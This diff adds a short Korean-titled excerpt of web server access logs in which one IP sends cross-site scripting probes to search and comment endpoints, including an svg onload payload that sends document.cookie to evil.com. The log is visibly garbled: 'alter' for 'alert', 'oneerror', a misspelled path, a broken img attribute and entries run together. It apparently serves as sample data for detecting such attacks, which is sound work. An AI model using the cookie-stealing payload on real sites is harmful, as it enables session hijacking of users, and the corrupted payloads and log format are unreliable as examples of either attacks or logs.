@@ -1,0 +1,6 @@
+데이터셋 로그 발췌 (45.77.22.90)
+
+45.77.22.90 - [14/Apr/2024 10:41:05] "GET /search?q=<script>alter(1)</script>" 200 4521 "Mozilla/5.0" 45.77.22.90 - [14/Apr/2024 10:41:07] "GET /serach?q=
+<img+src%30x+oneerror%3Dalter(1)>" 200 4521 "Mozilla/5.0" 45.77.22.90 - [14/Apr/2024 10:41:09] "Post /comment body=<svg/onload%3Dfetch('http%3A%2F%2Fevil.com%2F'%2Bdocument.cookie)>"
+200 512 45.77.22.90 - [14/Apr/2024 10:41:12] "GET /search?q=%3Cscript%3Ealter(document.domain)%3C%2Fscript%3E" 200 4521 "Mozilla/5.0"
+
